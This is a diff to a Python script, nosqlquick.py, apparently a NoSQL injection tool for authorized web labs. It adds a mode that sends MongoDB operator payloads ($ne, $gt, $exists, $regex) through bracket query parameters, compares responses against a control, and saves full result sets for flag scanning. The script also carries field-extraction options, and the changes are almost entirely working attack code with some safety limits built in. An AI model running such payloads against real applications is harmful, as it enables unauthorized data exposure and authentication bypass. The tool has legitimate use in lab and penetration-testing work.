@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""nosqlquick.py — guarded JSON/Mongo operator oracle for authorized web labs.
+"""nosqlquick.py — guarded JSON/query-string Mongo operator oracle for authorized web labs.
 
 The tool is deliberately endpoint- and field-aware. It never sprays an app:
 the caller must name the URL and every field that may receive an operator. Login,
@@ -24,10 +24,16 @@ Examples:
     --field email --field backupCode --lock email=user@example.test \
     --extract backupCode --success-json status=verified
 
+  # Probe a list endpoint's nested bracket parser. Full response bodies are kept
+  # because a type-juggled $ne result can include public rows plus one private row.
+  python3 nosqlquick.py --url https://target/api/items --query-container filter \
+    --field is_public --baseline is_public=true --probe
+
 Exit codes: 0 completed, 2 inconclusive/rate-limited, 3 circuit breaker,
 4 safety refusal or invalid extraction setup.
 """
 import argparse
+import hashlib
 import json
 import os
 import random
@@ -141,6 +147,8 @@ class Oracle:
             "Accept": "application/json, text/plain, */*",
             "Content-Type": "application/json",
         }
+        if args.query_container:
+            self.headers.pop("Content-Type")
         if args.token:
             self.headers["Authorization"] = "Bearer " + args.token
         if args.cookie:
@@ -156,6 +164,8 @@ class Oracle:
         self.flags = set()
         os.makedirs(args.out, exist_ok=True)
         self.log_path = os.path.join(args.out, "probes.jsonl")
+        self.response_dir = os.path.join(args.out, "responses")
+        os.makedirs(self.response_dir, exist_ok=True)
 
     def _health(self):
         try:
@@ -170,12 +180,19 @@ class Oracle:
         if isinstance(response, Exception):
             record = {"label": label, "payload": payload, "error": repr(response)}
         else:
+            stem = re.sub(r"[^A-Za-z0-9_.-]+", "_", label).strip("_") or "response"
+            body_path = os.path.join(self.response_dir, stem + ".body")
+            with open(body_path, "wb") as body_fh:
+                body_fh.write(response.content)
             record = {
                 "label": label,
                 "payload": payload,
                 "status": response.status_code,
                 "headers": dict(response.headers),
                 "body": (response.text or "")[:4000],
+                "body_bytes": len(response.content),
+                "body_sha256": hashlib.sha256(response.content).hexdigest(),
+                "response_body": os.path.relpath(body_path, self.args.out),
             }
         with open(self.log_path, "a", encoding="utf-8") as fh:
             fh.write(json.dumps(record, sort_keys=True) + "\n")
@@ -185,9 +202,14 @@ class Oracle:
             time.sleep(self.args.delay)
         self.requests += 1
         try:
-            response = self.session.post(
-                self.args.url, headers=self.headers, json=payload,
-                timeout=self.args.timeout, allow_redirects=False, verify=False)
+            if self.args.query_container:
+                response = self.session.get(
+                    self.args.url, headers=self.headers, params=payload,
+                    timeout=self.args.timeout, allow_redirects=False, verify=False)
+            else:
+                response = self.session.post(
+                    self.args.url, headers=self.headers, json=payload,
+                    timeout=self.args.timeout, allow_redirects=False, verify=False)
         except requests.RequestException as exc:
             self._record(label, payload, exc)
             raise CircuitBreak("request failed during %s: %s" % (label, exc))
@@ -238,6 +260,58 @@ def print_response(label, response, success):
     ctype = (response.headers.get("content-type") or "-").split(";", 1)[0]
     print("%-28s HTTP %-3s %-24s success=%s" %
           (label, response.status_code, ctype, "yes" if success else "no"))
+
+
+def nested_query_params(container, baseline, field=None, operator=None, value=None):
+    params = {"%s[%s]" % (container, key): str(item).lower()
+              if isinstance(item, bool) else str(item)
+              for key, item in baseline.items()}
+    if field is not None:
+        params.pop("%s[%s]" % (container, field), None)
+        suffix = "[%s]" % operator if operator else ""
+        params["%s[%s]%s" % (container, field, suffix)] = value
+    return params
+
+
+def query_probe_mode(oracle, fields, baseline, container):
+    """Probe bracket query parsing while retaining every full result set."""
+    scalar_params = nested_query_params(container, baseline)
+    scalar = oracle.send(scalar_params, "query-scalar-baseline")
+    print("%-28s HTTP %-3s %6db sha256=%s" %
+          ("scalar baseline", scalar.status_code, len(scalar.content),
+           hashlib.sha256(scalar.content).hexdigest()[:12]))
+
+    changed = 0
+    operators = (("$ne", "1"), ("$gt", ""), ("$exists", "true"), ("$regex", ".*"))
+    for field in fields:
+        # The bare control guards the exact parser edge that causes false negatives:
+        # filter[field][ne] is not Mongo's $ne operator and often silently no-ops.
+        bare_params = nested_query_params(container, baseline, field, "ne", "1")
+        bare = oracle.send(bare_params, "query-%s-bare-ne-control" % field)
+        bare_sig = response_signature(bare)
+        print("%-28s HTTP %-3s %6db control" %
+              ((field + " bare [ne]")[:28], bare.status_code, len(bare.content)))
+
+        for operator, value in operators:
+            params = nested_query_params(container, baseline, field, operator, value)
+            label = "query-%s-%s" % (field, operator.lstrip("$"))
+            response = oracle.send(params, label)
+            signature = response_signature(response)
+            differs = signature != bare_sig
+            if differs:
+                changed += 1
+            print("%-28s HTTP %-3s %6db %s saved=responses/%s.body" %
+                  ((field + " [" + operator + "]")[:28], response.status_code,
+                   len(response.content), "CANDIDATE" if differs else "unchanged",
+                   re.sub(r"[^A-Za-z0-9_.-]+", "_", label).strip("_")))
+
+    if changed:
+        print("[+] CANDIDATE: %d $-prefixed nested operator response(s) differed from "
+              "the bare [ne] control" % changed)
+    else:
+        print("[-] no nested-operator differential; inspect retained full bodies before clearing")
+    print("[i] Full result sets were scanned for flags and saved under %s" % oracle.response_dir)
+    return bool(changed)
 
 
 def probe_mode(oracle, fields, baseline, locks, map_shape):
@@ -359,6 +433,8 @@ def main():
     ap.add_argument("--url", required=True)
     ap.add_argument("--field", action="append", required=True,
                     help="field explicitly allowed to receive an operator; repeatable")
+    ap.add_argument("--query-container", metavar="NAME",
+                    help="use GET bracket params NAME[field][$op] instead of POST JSON")
     ap.add_argument("--baseline", action="append", default=[], metavar="FIELD=VALUE")
     ap.add_argument("--lock", action="append", default=[], metavar="FIELD=VALUE",
                     help="keep a field exact while enumerating/extracting another")
@@ -408,10 +484,27 @@ def main():
     if target and target not in fields:
         print("[!] target field %s is not allowlisted with --field" % target, file=sys.stderr)
         return 4
+    if args.query_container:
+        if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.-]*", args.query_container):
+            print("[!] --query-container must be one plain parameter name", file=sys.stderr)
+            return 4
+        if any(not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.-]*", field) for field in fields):
+            print("[!] query-mode fields must be plain names without brackets or $", file=sys.stderr)
+            return 4
+        if target or args.map_query_shape or locks:
+            print("[!] query mode supports the bounded --probe matrix only", file=sys.stderr)
+            return 4
+        missing = [field for field in fields if field not in baseline]
+        if missing:
+            print("[!] query mode requires a known scalar --baseline for every field: %s" %
+                  ", ".join(missing), file=sys.stderr)
+            return 4
 
     try:
         oracle = Oracle(args, predicates)
-        if args.enumerate:
+        if args.query_container:
+            query_probe_mode(oracle, fields, baseline, args.query_container)
+        elif args.enumerate:
             identity = args.identity_json or args.enumerate
             enumerate_mode(oracle, args.enumerate, fields, baseline, locks,
                            identity, args.start, args.max_records)
